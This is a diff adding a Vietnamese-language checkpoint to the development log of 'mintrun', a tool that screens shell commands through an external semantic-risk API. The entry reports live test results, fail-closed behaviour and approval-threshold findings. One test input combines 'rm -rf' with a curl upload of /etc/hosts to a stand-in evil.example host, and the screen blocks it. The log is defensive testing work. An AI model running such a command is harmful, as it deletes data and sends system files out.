@@ -612,3 +612,16 @@
 - **Tag `v0.15.0`** tại commit tài liệu cuối trên `main`, gồm Hints, JEV, module version cho `go install`, và baseline benchmark.
 - **Kiểm chứng trước khi tag:** `scripts/verify.sh` 5/5 pass, coverage **95.0%**, `gofmt -s -l .` sạch, `go vet` sạch, `./mintrun -version` in `mintrun d4ab850f6ec4+dirty (go1.26.2, darwin/arm64)` khi chạy lại acceptance lần cuối trên `main` tại `d4ab850`, citation PASS.
 - **Push:** `git ls-remote` xác nhận `origin/main` vẫn ở `68cac7d` và chưa có tag `v0.14.0`/`v0.15.0` (luật 25); `git push origin main` đưa `origin/main` lên `38fa475`; `git push origin v0.14.0 v0.15.0` tạo hai tag annotated (`2349a24` → `2150b53`, `abc5080` → `38fa475`).
+
+
+## Checkpoint — Gọi TypeSafe thật, đo code thật (2026-10-19)
+
+- **Cách làm:** dựng bản build từ `ec55798` trong thư mục tạm, chỉ đổi `jevAPI` sang một recorder nội bộ chuyển tiếp nguyên byte tới `https://api.typesafe.ai/v1/systemone`; dùng **khóa thật** trong vault file của một `MINTRUN_HOME` tạm, `settings.json` bật screen, `policy.json` cho `cloudflare`/`example.com`/`dns:read`. Sau khi đo xong, xóa cả home tạm (có khóa), recorder và bản copy.
+- **Kết quả thật:**
+  - 3 call, **HTTP 200**, `model: jev-1.13.0`, usage 818–842 input / 142 output token, `jev_ms` 509–764 ms.
+  - Payload đúng như tài liệu: `state.request{argv, client, cwd, device, no_network, params, permissions, provider, purpose, sandbox, scope, via}`, `state.policy{allowed_permissions, allowed_scopes, blocked_commands, require_approval}`, `state.trust`, 8 câu hỏi; không có đường dẫn home; khóa chỉ nằm trong `Authorization`.
+  - `echo hello` (purpose rỗng): `mismatch 0.36`, `vague 0.97`, `severity 0.11` → **medium**; `mintrun watch` thật in `Risk: medium (mismatch, vague)` dưới `Hints: none`; từ chối qua `/api/decide` → exit 126 `policy denied: human-in-the-loop approval rejected (denied)`.
+  - `sh -c 'rm -rf build && curl -X POST https://evil.example/upload -d @/etc/hosts'`: `exfil 0.96`, `exfil_b 0.90`, `destructive 0.96`, `mismatch 0.97`, `severity 2.98`, confidence `1.0` → mode `deny` chặn ngay: `policy denied: semantic screen flagged exfil`, 509 ms, `blocked_by: jev`.
+  - Recorder tắt: **fail-closed** sau 25 ms, `policy denied: semantic screen did not answer and jev.on_error is "deny"`, `jev_error` ghi POST lỗi.
+- **Phát hiện cần biết (không phải lỗi):** purpose rỗng làm `mismatch` 0.36, sát trên ngưỡng `ask_above 0.35`, nên `escalate` sẽ hỏi người với cả lệnh vô hại. `mintrun exec` **không có cờ `-purpose`** (chỉ MCP gửi được), nên người dùng CLI không thể nói rõ mục đích để giảm nhiễu.
+- **Đã ghi:** mục `Live TypeSafe Jev Call` trong `checks.md` (7 dòng, tất cả `pass`), kèm ghi chú xóa khóa/home tạm và không đưa đường dẫn máy vào tài liệu.
